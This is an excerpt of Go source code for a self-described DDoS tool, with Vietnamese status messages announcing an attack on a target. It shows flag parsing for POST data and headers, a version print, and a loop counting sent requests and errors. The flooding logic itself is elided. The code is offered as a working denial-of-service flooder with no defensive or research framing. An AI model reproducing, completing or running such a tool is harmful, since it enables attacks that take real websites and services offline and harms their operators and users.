...
func main() {
	...
	flag.StringVar(&data, "data", "", "Data to POST. If present đại will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	t := os.Getenv("NGHỊ_DDOS")
	...
	if version {
		fmt.Println("NGHỊ_DDOS", __version__)
		os.Exit(0)
	}
	...
	go func() {
		fmt.Println("--- DDoS Phát Triển Bởi Nguyễn Nghị ---\n       Bắt Đầu Tấn Công Mục Tiêu !\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("Sử Dụng Tấn Công | Số Lượng Tấn Công | Lỗi Khi Tấn Công")
		for {
			...
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d / %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\rKết Thúc Tấn Công Mục Tiêu !       \n\n\r")
				os.Exit(0)
			}
		}
	}()
